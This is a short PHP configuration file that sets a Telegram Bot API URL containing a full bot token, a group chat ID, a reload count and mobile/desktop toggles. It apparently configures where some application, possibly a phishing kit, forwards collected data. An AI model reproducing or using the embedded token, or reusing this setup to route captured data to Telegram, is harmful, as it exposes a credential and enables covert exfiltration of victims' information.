<?php

$METRI_TOKEN = "https://api.telegram.org/bot7824791570:AAH3Ct2hOTsA2F12R_yijvMOZMMnMdwXrP0";

$chat_id = "-4892125819";

$reload = '2';

$mobile = "on";   

$desktop = "on";

?>